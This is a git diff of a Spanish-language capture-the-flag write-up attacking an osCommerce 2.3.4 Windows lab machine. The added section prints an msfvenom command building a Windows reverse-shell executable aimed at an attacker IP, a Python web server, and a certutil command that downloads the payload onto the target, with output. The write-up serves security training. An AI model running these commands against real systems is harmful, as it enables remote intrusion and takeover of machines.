@@ -188,7 +188,7 @@ Toda la info del exploit lo tenemos en la url -> https://www.exploit-db.com/expl
 
 El tipo de shell que nos entrega este exploit no nos permite mucha movilidad.
 
-## Conseguimos una Reverse Shell
+## Conseguimos un RCE
 
 Ya que somos admin del equipo podrimos descargar con la ayuda del comando certutil un fichero en php que nos permita ejecutar comandos a traves de la web(URL), para posteriormente ejecutar una reverse shell y poder trabajar comodamente.  
 
@@ -234,10 +234,42 @@ Nos descargamos el fichero desde la maquina windows con certutil
     
 ![image](https://github.com/Esevka/CTF/assets/139042999/39a79773-a338-4be0-976c-705efc80cabf)
 
----
-Pues siguiento el proceso anterior creamos una reverse shell con msfvenom, seguidamente nos la descargamos a la maquina windows y la ejecutamos desde nuestro fichero rce.php, obteniendo una reverse shell.
+## Conseguimos una Reverse Shell
 
+Pues siguiendo el proceso anterior creamos una reverse shell con msfvenom, seguidamente nos la descargamos a la maquina windows y la ejecutamos desde nuestro fichero rce.php, obteniendo una reverse shell.
 
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
+    └─# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.64.232 LPORT=1988 -f exe -o reverse.exe
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x86 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 324 bytes
+    Final size of exe file: 73802 bytes
+    Saved as: reverse.exe
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
+    └─# python3 -m http.server 80 
+    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+       RCE_SHELL$ certutil -urlcache -f http://10.8.64.232/reverse.exe reverse.exe
+    ****  Online  ****
+    CertUtil: -URLCache command completed successfully.
+    
+    RCE_SHELL$ dir
+     Volume in drive C has no label.
+     Volume Serial Number is 14AF-C52C
+    
+     Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+    
+    07/12/2023  05:34 PM    <DIR>          .
+    07/12/2023  05:34 PM    <DIR>          ..
+    04/11/2019  10:52 PM               447 application.php
+    07/12/2023  05:36 PM             1,118 configure.php
+    04/11/2019  10:52 PM    <DIR>          functions
+    07/12/2023  05:33 PM                34 rce.php
+    07/12/2023  05:34 PM            73,802 reverse.exe
+                   4 File(s)         75,401 bytes
+                   3 Dir(s)  19,509,014,528 bytes free
 
 
     
